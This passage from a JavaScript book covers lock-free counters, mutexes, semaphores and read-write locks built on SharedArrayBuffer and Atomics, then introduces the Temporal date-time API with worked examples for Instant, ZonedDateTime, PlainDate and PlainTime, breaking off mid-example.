    // Update min
    let currentMin = Atomics.load(this.arr, 3);
    while (value < currentMin) {
      const old = Atomics.compareExchange(this.arr, 3, currentMin, value);
      if (old === currentMin) break;
      currentMin = old;
    }
    
    // Update max
    let currentMax = Atomics.load(this.arr, 4);
    while (value > currentMax) {
      const old = Atomics.compareExchange(this.arr, 4, currentMax, value);
      if (old === currentMax) break;
      currentMax = old;
    }
  }
  
  getStats() {
    return {
      count: Atomics.load(this.arr, 0),
      sum: Atomics.load(this.arr, 1),  // Note: ignoring overflow for simplicity
      min: Atomics.load(this.arr, 3),
      max: Atomics.load(this.arr, 4)
    };
  }
}
```

---

## 19.5 Mutex and Semaphore Implementation

Sometimes you need mutual exclusion. Here's how to build synchronization primitives with Atomics.

### Spinlock (Simple Mutex)

```javascript
// Simple spinlock - busy-waits (wastes CPU but low latency)
class Spinlock {
  constructor(sab, offset = 0) {
    this.arr = new Int32Array(sab, offset, 1);
    Atomics.store(this.arr, 0, 0);  // 0 = unlocked, 1 = locked
  }
  
  lock() {
    // Spin until we acquire the lock
    while (Atomics.compareExchange(this.arr, 0, 0, 1) !== 0) {
      // Busy wait - burns CPU
    }
  }
  
  unlock() {
    Atomics.store(this.arr, 0, 0);
  }
  
  tryLock() {
    return Atomics.compareExchange(this.arr, 0, 0, 1) === 0;
  }
}

// Usage
const sab = new SharedArrayBuffer(4);
const lock = new Spinlock(sab);

lock.lock();
try {
  // Critical section - only one thread at a time
  doSomethingCritical();
} finally {
  lock.unlock();
}
```

### Blocking Mutex (with wait/notify)

```javascript
// Mutex that sleeps instead of spinning - better for long waits
class Mutex {
  constructor(sab, offset = 0) {
    this.arr = new Int32Array(sab, offset, 1);
    Atomics.store(this.arr, 0, 0);  // 0 = unlocked, 1 = locked, 2 = contended
  }
  
  lock() {
    // Fast path: uncontended lock
    if (Atomics.compareExchange(this.arr, 0, 0, 1) === 0) {
      return;  // Got the lock immediately
    }
    
    // Slow path: contended lock
    while (true) {
      // Mark as contended (so unlock knows to wake waiters)
      const prev = Atomics.exchange(this.arr, 0, 2);
      if (prev === 0) return;  // Got the lock
      
      // Wait for unlock
      Atomics.wait(this.arr, 0, 2);  // Sleep until notified
    }
  }
  
  unlock() {
    const prev = Atomics.exchange(this.arr, 0, 0);
    
    // If there were waiters, wake one
    if (prev === 2) {
      Atomics.notify(this.arr, 0, 1);  // Wake one waiter
    }
  }
}
```

### Semaphore

```javascript
// Counting semaphore - allows N concurrent accesses
class Semaphore {
  constructor(sab, offset = 0, initialCount = 1) {
    this.arr = new Int32Array(sab, offset, 1);
    Atomics.store(this.arr, 0, initialCount);
  }
  
  acquire() {
    while (true) {
      const count = Atomics.load(this.arr, 0);
      
      if (count > 0) {
        // Try to decrement
        if (Atomics.compareExchange(this.arr, 0, count, count - 1) === count) {
          return;  // Acquired
        }
        // CAS failed, retry
      } else {
        // No permits available, wait
        Atomics.wait(this.arr, 0, 0);
      }
    }
  }
  
  release() {
    Atomics.add(this.arr, 0, 1);
    Atomics.notify(this.arr, 0, 1);  // Wake one waiter
  }
  
  tryAcquire() {
    const count = Atomics.load(this.arr, 0);
    if (count > 0) {
      return Atomics.compareExchange(this.arr, 0, count, count - 1) === count;
    }
    return false;
  }
}

// Usage: Connection pool with max 5 connections
const sab = new SharedArrayBuffer(4);
const pool = new Semaphore(sab, 0, 5);

async function useConnection() {
  pool.acquire();  // Blocks if 5 connections already in use
  try {
    await doWork();
  } finally {
    pool.release();
  }
}
```

### Read-Write Lock

```javascript
// Multiple readers OR single writer
class RWLock {
  constructor(sab, offset = 0) {
    // Layout: [readers_count, writer_flag]
    this.arr = new Int32Array(sab, offset, 2);
    Atomics.store(this.arr, 0, 0);  // readers = 0
    Atomics.store(this.arr, 1, 0);  // writer = 0
  }
  
  readLock() {
    while (true) {
      // Wait for no writer
      while (Atomics.load(this.arr, 1) !== 0) {
        Atomics.wait(this.arr, 1, 1);
      }
      
      // Increment reader count
      Atomics.add(this.arr, 0, 1);
      
      // Double-check no writer sneaked in
      if (Atomics.load(this.arr, 1) === 0) {
        return;  // Successfully acquired read lock
      }
      
      // Writer appeared, undo and retry
      Atomics.sub(this.arr, 0, 1);
    }
  }
  
  readUnlock() {
    const remaining = Atomics.sub(this.arr, 0, 1) - 1;
    if (remaining === 0) {
      // Last reader, notify waiting writers
      Atomics.notify(this.arr, 0, 1);
    }
  }
  
  writeLock() {
    // Acquire writer flag
    while (Atomics.compareExchange(this.arr, 1, 0, 1) !== 0) {
      Atomics.wait(this.arr, 1, 1);
    }
    
    // Wait for all readers to finish
    while (Atomics.load(this.arr, 0) !== 0) {
      Atomics.wait(this.arr, 0, Atomics.load(this.arr, 0));
    }
  }
  
  writeUnlock() {
    Atomics.store(this.arr, 1, 0);
    Atomics.notify(this.arr, 1, Infinity);  // Wake all waiters
  }
}
```

---

## 19.6 Real-World Patterns

### Parallel Map-Reduce

```javascript
// Parallel processing with work stealing

// Main thread
function parallelMapReduce(data, mapFn, reduceFn, numWorkers = 4) {
  const sab = new SharedArrayBuffer(
    4 +                          // work index
    4 +                          // completion count
    data.length * 8 +            // input data
    data.length * 8              // output data
  );
  
  const control = new Int32Array(sab, 0, 2);
  const input = new Float64Array(sab, 8, data.length);
  const output = new Float64Array(sab, 8 + data.length * 8, data.length);
  
  // Copy input data
  input.set(data);
  Atomics.store(control, 0, 0);  // work_index = 0
  Atomics.store(control, 1, 0);  // completed = 0
  
  // Spawn workers
  const workers = [];
  for (let i = 0; i < numWorkers; i++) {
    const w = new Worker('map-worker.js');
    w.postMessage({
      sab,
      mapFn: mapFn.toString(),
      dataLength: data.length
    });
    workers.push(w);
  }
  
  // Wait for completion
  return new Promise(resolve => {
    const check = () => {
      if (Atomics.load(control, 1) === data.length) {
        workers.forEach(w => w.terminate());
        
        // Reduce results
        const result = Array.from(output).reduce(reduceFn);
        resolve(result);
      } else {
        setTimeout(check, 10);
      }
    };
    check();
  });
}

// Worker (map-worker.js)
self.addEventListener('message', ({ data: { sab, mapFn, dataLength } }) => {
  const control = new Int32Array(sab, 0, 2);
  const input = new Float64Array(sab, 8, dataLength);
  const output = new Float64Array(sab, 8 + dataLength * 8, dataLength);
  
  const fn = eval(`(${mapFn})`);
  
  // Work stealing loop
  while (true) {
    const idx = Atomics.add(control, 0, 1);  // Claim work item
    if (idx >= dataLength) break;  // No more work
    
    output[idx] = fn(input[idx], idx);  // Process
    Atomics.add(control, 1, 1);  // Mark complete
  }
});

// Usage
parallelMapReduce(
  [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
  x => x * x,           // Map: square each
  (a, b) => a + b       // Reduce: sum
).then(result => {
  console.log('Sum of squares:', result);  // 385
});
```

### Progress Reporting

```javascript
// Report progress from workers to main thread

class ProgressTracker {
  constructor(numTasks) {
    this.sab = new SharedArrayBuffer(4 * 3);  // [completed, total, cancelled]
    this.arr = new Int32Array(this.sab);
    
    Atomics.store(this.arr, 0, 0);         // completed
    Atomics.store(this.arr, 1, numTasks);  // total
    Atomics.store(this.arr, 2, 0);         // cancelled
  }
  
  // Called by workers
  incrementProgress() {
    return Atomics.add(this.arr, 0, 1) + 1;
  }
  
  // Called by main thread
  getProgress() {
    const completed = Atomics.load(this.arr, 0);
    const total = Atomics.load(this.arr, 1);
    return { completed, total, percent: (completed / total) * 100 };
  }
  
  // Called by main thread to cancel
  cancel() {
    Atomics.store(this.arr, 2, 1);
    Atomics.notify(this.arr, 2, Infinity);
  }
  
  // Called by workers to check cancellation
  isCancelled() {
    return Atomics.load(this.arr, 2) === 1;
  }
}

// Usage
const tracker = new ProgressTracker(1000);

// Main thread: poll progress
const interval = setInterval(() => {
  const { completed, total, percent } = tracker.getProgress();
  console.log(`Progress: ${completed}/${total} (${percent.toFixed(1)}%)`);
  
  if (completed === total) {
    clearInterval(interval);
    console.log('Done!');
  }
}, 100);

// Worker: report progress
self.addEventListener('message', ({ data: { sab } }) => {
  const arr = new Int32Array(sab);
  
  for (let i = 0; i < 1000; i++) {
    if (Atomics.load(arr, 2) === 1) break;  // Check cancellation
    
    doWork(i);
    Atomics.add(arr, 0, 1);  // Report progress
  }
});
```

---

## 19.7 Common Pitfalls

### Pitfall 1: Forgetting Memory Barriers

```javascript
// âŒ BAD: Regular reads/writes have no ordering guarantees
let flag = 0;
let data = null;

// Thread A
data = computeResult();
flag = 1;  // Other threads might see flag=1 BEFORE data is ready!

// Thread B
while (flag === 0) {}  // Even after seeing flag=1, data might be stale!
console.log(data);

// âœ… GOOD: Use Atomics for synchronization
const sab = new SharedArrayBuffer(8);
const arr = new Int32Array(sab);

// Thread A
arr[1] = computeResult();
Atomics.store(arr, 0, 1);  // Memory barrier: all previous writes visible

// Thread B
while (Atomics.load(arr, 0) === 0) {}  // Memory barrier: sees all writes
console.log(arr[1]);  // Guaranteed to see correct data
```

### Pitfall 2: ABA Problem

```javascript
// ABA: Value changes Aâ†’Bâ†’A, CAS succeeds when it shouldn't

// âŒ BAD: Simple CAS loop
function popBad(stack, top) {
  const head = Atomics.load(stack, top);
  // >>> Another thread pops head, pushes new item at same location <<<
  // head is now different data, but same value!
  Atomics.compareExchange(stack, top, head, stack[head]);  // Succeeds wrongly!
}

// âœ… GOOD: Use generation counter
// Layout: [top | generation] packed into one Int32
function popGood(stack, topGen) {
  while (true) {
    const combined = Atomics.load(stack, topGen);
    const top = combined & 0xFFFF;
    const gen = combined >>> 16;
    
    if (top === 0) return undefined;
    
    const newCombined = ((gen + 1) << 16) | (stack[top] & 0xFFFF);
    if (Atomics.compareExchange(stack, topGen, combined, newCombined) === combined) {
      return stack[top];
    }
  }
}
```

### Pitfall 3: Deadlock

```javascript
// âŒ BAD: Deadlock from inconsistent lock ordering
const lockA = new Mutex(sabA);
const lockB = new Mutex(sabB);

// Thread 1
lockA.lock();
lockB.lock();  // Waits for Thread 2
// ...

// Thread 2
lockB.lock();
lockA.lock();  // Waits for Thread 1
// DEADLOCK!

// âœ… GOOD: Always acquire locks in consistent order
function safeOperation() {
  const locks = [lockA, lockB].sort((a, b) => a.id - b.id);
  
  locks[0].lock();
  locks[1].lock();
  try {
    // Critical section
  } finally {
    locks[1].unlock();
    locks[0].unlock();
  }
}
```

---

## 19.8 Summary

| Concept | Purpose | Key Methods |
|---------|---------|-------------|
| **SharedArrayBuffer** | Share memory between workers | `new SharedArrayBuffer(bytes)` |
| **Typed Array Views** | Read/write shared memory | `new Int32Array(sab)` |
| **Atomics.add/sub** | Atomic arithmetic | `Atomics.add(arr, idx, val)` |
| **Atomics.compareExchange** | Conditional atomic update | `Atomics.compareExchange(arr, idx, expected, new)` |
| **Atomics.wait/notify** | Thread synchronization | `Atomics.wait(arr, idx, val)` |
| **Atomics.load/store** | Memory barriers | `Atomics.load(arr, idx)` |

### When to Use

| Pattern | Use Case |
|---------|----------|
| **Lock-free counter** | High-frequency updates, statistics |
| **Spinlock** | Short critical sections, low contention |
| **Blocking mutex** | Long critical sections, high contention |
| **Semaphore** | Resource pools, rate limiting |
| **SPSC Queue** | Producer-consumer pipelines |

### Best Practices

1. **Prefer lock-free** when possible (better performance, no deadlocks)
2. **Use blocking wait** for long waits (saves CPU vs spinning)
3. **Consistent lock ordering** to prevent deadlocks
4. **Generation counters** to prevent ABA problems
5. **Memory barriers** (Atomics.load/store) for non-atomic data synchronization

---

**End of Chapter 19**


# 20-Temporal-API-S3.md

# 20 Temporal API (Stage 3)

---

## Why Temporal Matters

The JavaScript `Date` object is fundamentally broken. It was copied from Java's `java.util.Date` in 1995, which Java itself deprecated in 1997. Every professional JavaScript developer has encountered these problems:

### Problems with Date

```javascript
// âŒ Problem 1: Months are 0-indexed (January = 0)
const date = new Date(2024, 1, 1);  // February 1st, NOT January!
console.log(date);  // Thu Feb 01 2024

// âŒ Problem 2: Date is mutable (causes bugs)
const original = new Date('2024-01-15');
const modified = original;
modified.setMonth(5);
console.log(original);  // June! Original was mutated!

// âŒ Problem 3: Parsing is inconsistent across browsers
new Date('2024-01-15');     // Parsed as UTC in some browsers, local in others
new Date('2024-1-15');      // Invalid in some browsers, works in others
new Date('01/15/2024');     // US format? European? Depends on locale

// âŒ Problem 4: No timezone support
const nyTime = new Date();  // What timezone is this? Depends on system!
// Can't represent "3pm in Tokyo" - only "3pm in local timezone"

// âŒ Problem 5: DST handling is a nightmare
const dst = new Date('2024-03-10T02:30:00');  // 2:30 AM doesn't exist! (DST skip)
// Date silently gives wrong time

// âŒ Problem 6: No duration type
const start = new Date('2024-01-01');
const end = new Date('2024-12-31');
const diff = end - start;  // 31449600000 ms... now what?
// How many months? No way to know!

// âŒ Problem 7: No calendar support
// Can't work with Hebrew, Islamic, Japanese calendars
```

### How Temporal Fixes Everything

```javascript
// âœ… Fix 1: Human-readable month (1-indexed)
const date = Temporal.PlainDate.from({ year: 2024, month: 1, day: 1 });
console.log(date.toString());  // 2024-01-01 (January!)

// âœ… Fix 2: Immutable (no mutation bugs)
const original = Temporal.PlainDate.from('2024-01-15');
const modified = original.with({ month: 6 });
console.log(original.toString());  // 2024-01-15 (unchanged!)
console.log(modified.toString());  // 2024-06-15

// âœ… Fix 3: Consistent parsing
const parsed = Temporal.PlainDate.from('2024-01-15');  // Always works
// Temporal.PlainDate.from('01/15/2024');  // Throws! Ambiguous formats rejected

// âœ… Fix 4: First-class timezone support
const tokyo = Temporal.ZonedDateTime.from('2024-01-15T15:00[Asia/Tokyo]');
const newYork = tokyo.withTimeZone('America/New_York');
console.log(tokyo.toString());    // 2024-01-15T15:00:00+09:00[Asia/Tokyo]
console.log(newYork.toString());  // 2024-01-15T01:00:00-05:00[America/New_York]

// âœ… Fix 5: DST is handled correctly
const beforeDST = Temporal.ZonedDateTime.from('2024-03-10T01:30[America/New_York]');
const afterDST = beforeDST.add({ hours: 1 });
console.log(afterDST.toString());  // 2024-03-10T03:30:00-04:00 (skipped 2AM correctly!)

// âœ… Fix 6: Real duration type
const start = Temporal.PlainDate.from('2024-01-01');
const end = Temporal.PlainDate.from('2024-12-31');
const duration = start.until(end, { largestUnit: 'months' });
console.log(duration.months, duration.days);  // 11 months, 30 days

// âœ… Fix 7: Multiple calendar systems
const hebrew = Temporal.PlainDate.from('2024-01-15').withCalendar('hebrew');
console.log(hebrew.toString());  // 2024-01-15[u-ca=hebrew]
console.log(hebrew.year, hebrew.month, hebrew.day);  // Hebrew year/month/day
```

---

**Note:** The Temporal API is currently a Stage 3 proposal. This document describes the proposed API which may change before final standardization. You may need a polyfill to use Temporal in current environments.

**Installation (Polyfill):**

```bash
npm install @js-temporal/polyfill
```

```javascript
// Import polyfill
import { Temporal } from '@js-temporal/polyfill';

// Or in browser:
// <script src="https://cdn.jsdelivr.net/npm/@js-temporal/polyfill/dist/index.umd.js"></script>
```

---

## 20.1 Temporal.Instant

`Temporal.Instant` represents an absolute point in time, independent of timezone or calendar. It's like a timestamp.

### Absolute Point in Time

An Instant is a precise moment in the universal timeline.

**Creating Instants:**

```javascript
// Current moment
const now = Temporal.Now.instant();
console.log(now.toString());
// "2024-02-10T14:30:45.123456789Z"

// From epoch nanoseconds
const instant1 = Temporal.Instant.fromEpochNanoseconds(1707574245123456789n);
console.log(instant1.toString());

// From epoch milliseconds
const instant2 = Temporal.Instant.fromEpochMilliseconds(1707574245123);
console.log(instant2.toString());

// From ISO string
const instant3 = Temporal.Instant.from('2024-02-10T14:30:45.123456789Z');
console.log(instant3.toString());

// From Date object
const date = new Date();
const instant4 = Temporal.Instant.fromEpochMilliseconds(date.getTime());
console.log(instant4.toString());
```

**Comparing Instants:**

```javascript
const instant1 = Temporal.Instant.from('2024-02-10T10:00:00Z');
const instant2 = Temporal.Instant.from('2024-02-10T12:00:00Z');

// Compare
console.log(Temporal.Instant.compare(instant1, instant2)); // -1 (instant1 is earlier)
console.log(Temporal.Instant.compare(instant2, instant1)); // 1 (instant2 is later)
console.log(Temporal.Instant.compare(instant1, instant1)); // 0 (equal)

// Equality
console.log(instant1.equals(instant2)); // false
console.log(instant1.equals(instant1)); // true

// Comparison methods
console.log(instant1.toString() < instant2.toString()); // true (string comparison works)
```

**Arithmetic with Instants:**

```javascript
const instant = Temporal.Instant.from('2024-02-10T10:00:00Z');

// Add duration
const later = instant.add({ hours: 2, minutes: 30 });
console.log(later.toString()); // "2024-02-10T12:30:00Z"

// Subtract duration
const earlier = instant.subtract({ hours: 1 });
console.log(earlier.toString()); // "2024-02-10T09:00:00Z"

// Time between instants
const instant1 = Temporal.Instant.from('2024-02-10T10:00:00Z');
const instant2 = Temporal.Instant.from('2024-02-10T12:30:00Z');

const duration = instant1.until(instant2);
console.log(duration.toString()); // "PT2H30M"
console.log(duration.hours); // 2
console.log(duration.minutes); // 30

// Time since
const duration2 = instant2.since(instant1);
console.log(duration2.toString()); // "PT2H30M"
```

### UTC Timestamps

Instants are always in UTC and can be converted to/from various timestamp formats.

**Epoch Time Conversions:**

```javascript
const instant = Temporal.Instant.from('2024-02-10T14:30:45.123456789Z');

// Get epoch times
console.log('Nanoseconds:', instant.epochNanoseconds);
// 1707574245123456789n

console.log('Microseconds:', instant.epochMicroseconds);
// 1707574245123456n

console.log('Milliseconds:', instant.epochMilliseconds);
// 1707574245123

console.log('Seconds:', instant.epochSeconds);
// 1707574245

// Convert to Date
const jsDate = new Date(instant.epochMilliseconds);
console.log(jsDate.toISOString());
```

**High-Precision Timestamps:**

```javascript
// Temporal preserves nanosecond precision
const precise = Temporal.Instant.fromEpochNanoseconds(
  1707574245123456789n
);

console.log('Nanoseconds:', precise.epochNanoseconds);
// 1707574245123456789n

// Date only has millisecond precision
const jsDate = new Date(precise.epochMilliseconds);
console.log('JS Date ms:', jsDate.getTime());
// 1707574245123 (nanoseconds lost)

// Temporal preserves all precision
const roundTrip = Temporal.Instant.fromEpochMilliseconds(
  precise.epochMilliseconds
);
console.log('Round trip:', roundTrip.epochNanoseconds);
// 1707574245123000000n (microseconds/nanoseconds lost)
```

**Measuring Performance:**

```javascript
// High-resolution timing
const start = Temporal.Now.instant();

// Do some work
for (let i = 0; i < 1000000; i++) {
  Math.sqrt(i);
}

const end = Temporal.Now.instant();

// Calculate duration
const elapsed = start.until(end);
console.log('Elapsed time:', elapsed.toString());

// Get precise nanoseconds
const nanos = end.epochNanoseconds - start.epochNanoseconds;
console.log('Nanoseconds:', nanos);

// Convert to milliseconds
const ms = Number(nanos) / 1_000_000;
console.log('Milliseconds:', ms.toFixed(3));
```

**Instant Methods:**

```javascript
const instant = Temporal.Now.instant();

// Convert to timezone-aware datetime
const zonedDateTime = instant.toZonedDateTimeISO('America/New_York');
console.log(zonedDateTime.toString());

// Round to nearest unit
const rounded = instant.round({
  smallestUnit: 'second',
  roundingMode: 'halfExpand'
});
console.log(rounded.toString());

// Round to nearest hour
const hourly = instant.round({ smallestUnit: 'hour' });
console.log(hourly.toString());

// Format as string with different precisions
console.log(instant.toString({ smallestUnit: 'second' }));
console.log(instant.toString({ smallestUnit: 'millisecond' }));
console.log(instant.toString({ smallestUnit: 'microsecond' }));
console.log(instant.toString({ smallestUnit: 'nanosecond' }));
```

---

## 20.2 Temporal.ZonedDateTime

`Temporal.ZonedDateTime` represents a date and time in a specific timezone.

### Date/Time with Timezone

ZonedDateTime combines a wall-clock time with a timezone.

**Creating ZonedDateTime:**

```javascript
// Current time in a timezone
const now = Temporal.Now.zonedDateTimeISO('America/New_York');
console.log(now.toString());
// "2024-02-10T09:30:45.123456789-05:00[America/New_York]"

// From ISO string
const zdt1 = Temporal.ZonedDateTime.from(
  '2024-02-10T14:30:00-05:00[America/New_York]'
);
console.log(zdt1.toString());

// From object
const zdt2 = Temporal.ZonedDateTime.from({
  year: 2024,
  month: 2,
  day: 10,
  hour: 14,
  minute: 30,
  timeZone: 'America/New_York'
});
console.log(zdt2.toString());

// From instant
const instant = Temporal.Now.instant();
const zdt3 = instant.toZonedDateTimeISO('Europe/London');
console.log(zdt3.toString());
```

**Timezone Conversions:**

```javascript
const nyTime = Temporal.ZonedDateTime.from(
  '2024-02-10T14:30:00-05:00[America/New_York]'
);

// Convert to different timezone (same instant)
const tokyoTime = nyTime.withTimeZone('Asia/Tokyo');
console.log('New York:', nyTime.toString());
console.log('Tokyo:', tokyoTime.toString());

// Convert to UTC
const utcTime = nyTime.withTimeZone('UTC');
console.log('UTC:', utcTime.toString());

// Convert to London
const londonTime = nyTime.withTimeZone('Europe/London');
console.log('London:', londonTime.toString());

// All represent the same instant
console.log(nyTime.epochMilliseconds === tokyoTime.epochMilliseconds); // true
```

**Accessing Components:**

```javascript
const zdt = Temporal.ZonedDateTime.from(
  '2024-02-10T14:30:45.123-05:00[America/New_York]'
);

// Date components
console.log('Year:', zdt.year);           // 2024
console.log('Month:', zdt.month);         // 2
console.log('Day:', zdt.day);             // 10

// Time components
console.log('Hour:', zdt.hour);           // 14
console.log('Minute:', zdt.minute);       // 30
console.log('Second:', zdt.second);       // 45
console.log('Millisecond:', zdt.millisecond); // 123

// Timezone information
console.log('Timezone:', zdt.timeZoneId); // "America/New_York"
console.log('Offset:', zdt.offset);       // "-05:00"
console.log('Offset nanoseconds:', zdt.offsetNanoseconds); // -18000000000000

// Day of week
console.log('Day of week:', zdt.dayOfWeek); // 6 (Saturday)

// Day of year
console.log('Day of year:', zdt.dayOfYear); // 41
```

**Arithmetic with Timezone Awareness:**

```javascript
const zdt = Temporal.ZonedDateTime.from(
  '2024-03-10T01:30:00-05:00[America/New_York]'
);

// Add 2 hours (crosses DST boundary in this example)
const later = zdt.add({ hours: 2 });
console.log('Original:', zdt.toString());
console.log('Later:', later.toString());

// Duration respects timezone rules
const zdt1 = Temporal.ZonedDateTime.from(
  '2024-03-09T23:00:00-05:00[America/New_York]'
);
const zdt2 = zdt1.add({ hours: 3 });
console.log('Before DST:', zdt1.toString());
console.log('After DST:', zdt2.toString());
// Note: The offset changes due to DST

// Add days (maintains wall-clock time)
const tomorrow = zdt.add({ days: 1 });
console.log('Tomorrow:', tomorrow.toString());
```

**DST Handling:**

```javascript
// DST transition in America/New_York (Spring Forward)
// March 10, 2024, 2:00 AM â†’ 3:00 AM

const beforeDST = Temporal.ZonedDateTime.from(
  '2024-03-10T01:30:00-05:00[America/New_York]'
);

// Add 1 hour (crosses DST)
const afterDST = beforeDST.add({ hours: 1 });

console.log('Before DST:', beforeDST.toString());
// "2024-03-10T01:30:00-05:00[America/New_York]"

console.log('After DST:', afterDST.toString());
// "2024-03-10T03:30:00-04:00[America/New_York]"
// Note: Time jumped from 1:30 to 3:30 (2:30 doesn't exist)
// Offset changed from -05:00 to -04:00

// Time that doesn't exist (during DST gap)
// This is handled gracefully
const nonexistent = Temporal.ZonedDateTime.from({
  year: 2024,
  month: 3,
  day: 10,
  hour: 2,
  minute: 30,
  timeZone: 'America/New_York',
  // Can specify disambiguation: 'compatible', 'earlier', 'later', 'reject'
  disambiguation: 'compatible' // default: chooses later time
});

console.log('Nonexistent time:', nonexistent.toString());
// "2024-03-10T03:30:00-04:00[America/New_York]"
```

**Comparing ZonedDateTime:**

```javascript
const ny1 = Temporal.ZonedDateTime.from(
  '2024-02-10T14:30:00-05:00[America/New_York]'
);

const ny2 = Temporal.ZonedDateTime.from(
  '2024-02-10T15:30:00-05:00[America/New_York]'
);

// Same instant in different timezone
const tokyo = ny1.withTimeZone('Asia/Tokyo');

// Compare
console.log(Temporal.ZonedDateTime.compare(ny1, ny2)); // -1
console.log(ny1.equals(ny2)); // false
console.log(ny1.equals(tokyo)); // false (different timezone)

// Check if same instant
console.log(ny1.epochMilliseconds === tokyo.epochMilliseconds); // true
```

---

## 20.3 Temporal.PlainDate

`Temporal.PlainDate` represents a calendar date without time or timezone.

### Calendar Date (No Time)

PlainDate is useful for dates like birthdays, holidays, or deadlines.

**Creating PlainDate:**

```javascript
// Today's date
const today = Temporal.Now.plainDateISO();
console.log(today.toString()); // "2024-02-10"

// From components
const date1 = Temporal.PlainDate.from({ year: 2024, month: 2, day: 10 });
console.log(date1.toString()); // "2024-02-10"

// From ISO string
const date2 = Temporal.PlainDate.from('2024-02-10');
console.log(date2.toString());

// Specific calendar
const date3 = new Temporal.PlainDate(2024, 2, 10, 'iso8601');
console.log(date3.toString());
```

**Accessing Components:**

```javascript
const date = Temporal.PlainDate.from('2024-02-10');

console.log('Year:', date.year);         // 2024
console.log('Month:', date.month);       // 2
console.log('Day:', date.day);           // 10
console.log('Day of week:', date.dayOfWeek); // 6 (Saturday)
console.log('Day of year:', date.dayOfYear); // 41
console.log('Week of year:', date.weekOfYear); // 6
console.log('Days in month:', date.daysInMonth); // 29 (2024 is leap year)
console.log('Days in year:', date.daysInYear); // 366
console.log('Months in year:', date.monthsInYear); // 12
console.log('Is leap year:', date.inLeapYear); // true

// Month code (useful for non-Gregorian calendars)
console.log('Month code:', date.monthCode); // "M02"
```

**Date Arithmetic:**

```javascript
const date = Temporal.PlainDate.from('2024-02-10');

// Add duration
const nextWeek = date.add({ weeks: 1 });
console.log('Next week:', nextWeek.toString()); // "2024-02-17"

const nextMonth = date.add({ months: 1 });
console.log('Next month:', nextMonth.toString()); // "2024-03-10"

const nextYear = date.add({ years: 1 });
console.log('Next year:', nextYear.toString()); // "2025-02-10"

// Subtract duration
const lastWeek = date.subtract({ weeks: 1 });
console.log('Last week:', lastWeek.toString()); // "2024-02-03"

// Complex durations
const later = date.add({ years: 1, months: 2, days: 15 });
console.log('Later:', later.toString()); // "2025-04-25"
```

**Date Comparison:**

```javascript
const date1 = Temporal.PlainDate.from('2024-02-10');
const date2 = Temporal.PlainDate.from('2024-03-15');
const date3 = Temporal.PlainDate.from('2024-02-10');

// Compare
console.log(Temporal.PlainDate.compare(date1, date2)); // -1
console.log(Temporal.PlainDate.compare(date2, date1)); // 1
console.log(Temporal.PlainDate.compare(date1, date3)); // 0

// Equality
console.log(date1.equals(date2)); // false
console.log(date1.equals(date3)); // true
```

**Duration Between Dates:**

```javascript
const start = Temporal.PlainDate.from('2024-02-10');
const end = Temporal.PlainDate.from('2024-05-20');

// Duration until
const duration = start.until(end);
console.log(duration.toString()); // "P3M10D"
console.log('Months:', duration.months); // 3
console.log('Days:', duration.days); // 10

// Total days
const totalDays = start.until(end, { largestUnit: 'day' });
console.log('Total days:', totalDays.days); // 100

// Duration since
const duration2 = end.since(start);
console.log(duration2.toString()); // "P3M10D"

// Different units
const weeks = start.until(end, { largestUnit: 'week' });
console.log('Weeks:', weeks.weeks, 'Days:', weeks.days);
```

**Practical Examples:**

```javascript
// Calculate age
function calculateAge(birthDate) {
  const today = Temporal.Now.plainDateISO();
  const age = birthDate.until(today, { largestUnit: 'year' });
  return age.years;
}

const birthDate = Temporal.PlainDate.from('1990-05-15');
console.log('Age:', calculateAge(birthDate));

// Days until event
function daysUntil(eventDate) {
  const today = Temporal.Now.plainDateISO();
  const duration = today.until(eventDate, { largestUnit: 'day' });
  return duration.days;
}

const christmas = Temporal.PlainDate.from('2024-12-25');
console.log('Days until Christmas:', daysUntil(christmas));

// Is weekend
function isWeekend(date) {
  return date.dayOfWeek === 6 || date.dayOfWeek === 7; // Saturday or Sunday
}

console.log('Is today weekend?', isWeekend(today));

// Next business day
function nextBusinessDay(date) {
  let next = date.add({ days: 1 });
  while (isWeekend(next)) {
    next = next.add({ days: 1 });
  }
  return next;
}

console.log('Next business day:', nextBusinessDay(today).toString());
```

---

## 20.4 Temporal.PlainTime

`Temporal.PlainTime` represents a wall-clock time without date or timezone.

### Clock Time (No Date)

PlainTime is useful for times like "9:00 AM" or "14:30".

**Creating PlainTime:**

```javascript
// Current time
const now = Temporal.Now.plainTimeISO();
console.log(now.toString()); // "14:30:45.123456789"

// From components
const time1 = Temporal.PlainTime.from({ hour: 14, minute: 30 });
console.log(time1.toString()); // "14:30:00"

const time2 = Temporal.PlainTime.from({
  hour: 14,
  minute: 30,
  second: 45,
  millisecond: 123
});
console.log(time2.toString()); // "14:30:45.123"

// From ISO string
const time3 = Temporal.PlainTime.from('14:30:45.123');
console.log(time3.toString());

// From partial object
const time4 = Temporal.PlainTime.from({ hour: 9 });
console.log(time4.toString()); // "09:00:00"
```

**Accessing Components:**

```javascript
const time = Temporal.PlainTime.from('14:30:45.123456789');

console.log('Hour:', time.hour);                 // 14
console.log('Minute:', time.minute);             // 30
console.log('Second:', time.second);             // 45
console.log('Millisecond:', time.millisecond);   // 123
console.log('Microsecond:', time.microsecond);   // 456
console.log('Nanosecond:', time.nanosecond);     // 789
```

**Time Arithmetic:**

```javascript
const time = Temporal.PlainTime.from('14:30:00');

// Add duration
const later = time.add({ hours: 2, minutes: 30 });
console.log('Later:', later.toString()); // "17:00:00"

const muchLater = time.add({ hours: 12 });
console.log('Much later:', muchLater.toString()); // "02:30:00" (wraps around)

// Subtract duration
const earlier = time.subtract({ hours: 1, minutes: 15 });
console.log('Earlier:', earlier.toString()); // "13:15:00"

// Duration between times
const time1 = Temporal.PlainTime.from('09:00:00');
const time2 = Temporal.PlainTime.from('17:30:00');

const duration = time1.until(time2);
console.log('Duration:', duration.toString()); // "PT8H30M"
console.log('Hours:', duration.hours); // 8
console.log('Minutes:', duration.minutes); // 30
```

**Time Comparison:**

```javascript
const time1 = Temporal.PlainTime.from('09:00:00');
const time2 = Temporal.PlainTime.from('17:30:00');
const time3 = Temporal.PlainTime.from('09:00:00');

// Compare
console.log(Temporal.PlainTime.compare(time1, time2)); // -1
console.log(Temporal.PlainTime.compare(time2, time1)); // 1
console.log(Temporal.PlainTime.compare(time1, time3)); // 0

// Equality
console.log(time1.equals(time2)); // false
console.log(time1.equals(time3)); // true
```

**Practical Examples:**

```javascript
// Business hours check
function isDuringBusinessHours(time) {
  const start = Temporal.PlainTime.from('09:00');
  const end = Temporal.PlainTime.from('17:00');
  
  return Temporal.PlainTime.compare(time, start) >= 0 &&
